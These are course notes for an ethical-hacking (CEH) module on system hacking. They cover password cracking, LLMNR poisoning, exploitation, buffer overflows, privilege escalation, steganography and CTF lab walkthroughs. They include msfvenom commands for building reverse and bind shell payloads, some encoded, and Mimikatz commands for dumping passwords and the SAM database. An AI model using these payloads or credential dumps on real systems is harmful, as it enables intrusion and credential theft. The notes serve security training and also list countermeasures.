---
source: Module 6 System hacking part 1.pdf, part 2.pdf, part 3.pdf, part4.pdf (instructor deck, full — 4 parts)
session: 4, 5, 6
---

# Module 6 — System Hacking

> This is the largest module — split across 4 instructor-deck parts and
> 3 course sessions (S4: Access, S5: Exploitation, S6: Privesc & Capstone).

## Official learning objectives (CEH Ch.6)

1. Explain System Hacking Concepts
2. Describe Password Cracking Techniques and Countermeasures
3. Explain Vulnerability Exploitation
4. Describe Buffer Overflow Concepts
5. Explain Privilege Escalation Techniques
6. Explain Maintaining Access and Covering Tracks
7. Explain Steganography Concepts

---

## Part 1 — Authentication, Password Cracking, LLMNR, Intro to Exploitation (Session 4)

### 1. Authentication Concepts

Authentication = verifying identities. Methods:
- Passwords
- Tokens / digital signatures
- Public keys
- Biometrics

**Passwords must be stored hashed, never in plaintext.**

### 2. Hash Algorithms

Hash = one-way function, variable input → fixed-length output. Cannot be
reversed ("dehashed"). Common: MD5, SHA-1, SHA-256, NTLM, LM.

**Password salting:** append random data before hashing to defeat
rainbow-table attacks.

### 3. Windows Authentication

Passwords stored in the **SAM** (Security Accounts Manager) file.

| Type | How it works |
|---|---|
| NTLM | Hash-based, offline auth using SAM. Challenge-response over network. Legacy, still widely present. |
| Kerberos | Ticket-based, client-server architecture via KDC (Key Distribution Center). Modern, used in Active Directory. |

### 4. Password Cracking

Recovering passwords from hashes. Successful largely due to weak/guessable
passwords.

| Attack type | Description |
|---|---|
| Dictionary | Try words from a wordlist (e.g. `rockyou.txt`) |
| Brute-force | Try every combination systematically |
| Rule-based | Apply mutations to dictionary words (append numbers, capitalize) |
| Rainbow table | Precomputed hash-to-password lookup (defeated by salting) |
| Hybrid | Combine dictionary + brute-force |

**Tools:** hashcat (GPU-accelerated, mode-based: `-m 0` for MD5, etc.),
hash-identifier (determine hash type), John the Ripper.

### 5. LLMNR Poisoning

**LLMNR** (Link-Local Multicast Name Resolution) — Windows name resolution
fallback when DNS fails. Broadcasts a query to the local network.

**Attack:** attacker runs Responder on the network → victim's LLMNR query
is answered by attacker → victim sends NTLMv2 hash to attacker →
attacker cracks hash offline.

**Tool:** `responder` (Kali).

**Countermeasures:** disable LLMNR and NBT-NS in Group Policy; use DNS
properly; require SMB signing; implement NAC.

### 6. Shell Types

| Type | Flow | Use case |
|---|---|---|
| Reverse shell | Target connects back to attacker's listener | Most common — bypasses inbound firewall rules |
| Bind shell | Attacker connects to a port opened on target | Simpler but often blocked by firewalls |

### 7. Introduction to Exploitation

First exploitation exercises: **VSFTPD 2.3.4** backdoor on Metasploitable2
(Metasploit module), **EternalBlue** (MS17-010) on Windows (SMBv1
vulnerability, NSA-leaked 2017).

**Blue CTF machine** walkthrough included.

**Countermeasures:** strong passwords, disable LLMNR, patch systems,
network segmentation.

---

## Part 2 — Manual Exploitation, Malware, Buffer Overflow (Session 5)

### 8. Manual Exploitation

Beyond Metasploit — manually exploiting services using:
- Custom payloads with `msfvenom`
- Hosting payloads on Apache
- Setting up handlers manually

### 9. Payload Generation with msfvenom

| Payload | Command |
|---|---|
| Windows reverse shell | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe` |
| Windows bind shell | `msfvenom -p windows/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f exe > bind.exe` |
| Encoded (shikata_ga_nai) | `msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe` |
| Linux | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > reverse.elf` |
| macOS | `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > reverse.macho` |
| PHP | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php` |

### 10. Buffer Overflow

One of the most commonly exploited vulnerability classes. Occurs when more
data is written to a buffer than it can hold, overwriting adjacent memory
(return address → redirect execution).

**Concepts:** stack, buffer, EIP (instruction pointer), NOP sled, shellcode.

**Practical flow (from deck):**
1. Fuzz the target (vulnserver) to find crash point
2. Identify EIP offset
3. Overwrite EIP with address pointing to shellcode
4. Execute payload

**CTF walkthroughs:** Kioptrix (SMB buffer overflow via Metasploit),
Blue machine (EternalBlue).

**Countermeasures:** input validation, ASLR, DEP/NX bit, stack canaries,
secure coding practices, code review.

---

## Part 3 — Privilege Escalation & Steganography (Session 6)

### 11. Privilege Escalation

| Type | Description |
|---|---|
| Vertical | Low-privilege user → root/admin (most common, most dangerous) |
| Horizontal | Same privilege level but access another user's resources |

### Privilege Escalation Techniques

| Technique | Description |
|---|---|
| Credential exploitation | Credential stuffing, password spraying against discovered accounts |
| Kernel exploits | Exploit OS kernel vulnerabilities (check with `uname -a`, LinPEAS) |
| Vulnerable software | Exploit outdated/misconfigured applications |
| Weak service configurations | Writable service binaries, unquoted service paths, weak permissions |
| Mimikatz | Windows: dump plaintext passwords, hashes, Kerberos tickets from memory |
| Cron job abuse | Writable scripts executed by root via cron |
| SUID binaries | Binaries with SUID bit set — check GTFOBins for exploitable ones |

### Linux Privilege Escalation Workflow (Academy CTF walkthrough)

1. Enumerate with **LinPEAS** (automated enumeration)
2. Find interesting files (credentials, writable scripts, SUID binaries)
3. Check cron jobs (`crontab -l`, `/etc/crontab`)
4. Look for credential reuse (SSH with found passwords)
5. Exploit writable cron script or SUID binary → root

### Windows Privilege Escalation

**Mimikatz** commands (from deck):
- `privilege::debug` — enable debug privilege
- `sekurlsa::logonpasswords` — dump plaintext passwords from memory
- `lsadump::sam` — dump SAM database
- `kerberos::list` — list Kerberos tickets

### 12. Steganography

Art of hiding data inside other data (hidden communication).

| Technique | Tool | Method |
|---|---|---|
| Image steganography | Xiao Steganography | Pixel substitution — hide data in image pixels |
| NTFS Alternate Data Streams | `type secret.txt > image.jpg:hidden.txt` | Hide data in ADS on NTFS filesystem |

**Detection:** compare file sizes, use stego-detection tools (stegseek,
steghide, binwalk), check ADS with `dir /r`.

---

## Part 4 — Mid-Course Capstone CTF Walkthroughs (Session 6)

### DoubleTrouble Machine Walkthrough

1. Host discovery → nmap scan → searchsploit
2. Subdirectory enumeration → find `/secret` with image
3. Stegseek on image → extract credentials
4. Login → find upload endpoint → upload reverse shell
5. Get shell → privilege escalation

### Blackpearl Machine Walkthrough

1. Host discovery → nmap → subdirectory enumeration
2. Find `/secret` → view page source → DNS enumeration
3. Add domain to `/etc/hosts` → new subdirectory scan
4. Find Navigate CMS → Metasploit exploit → shell as www-data
5. LinPEAS → PHP with SUID permission → GTFOBins → root

### Key Patterns (for teaching)

Both CTF walkthroughs follow the same methodology: recon → scan →
enumerate → find vulnerability → exploit → escalate privileges. This
reinforces the hacking phases taught in Module 1.
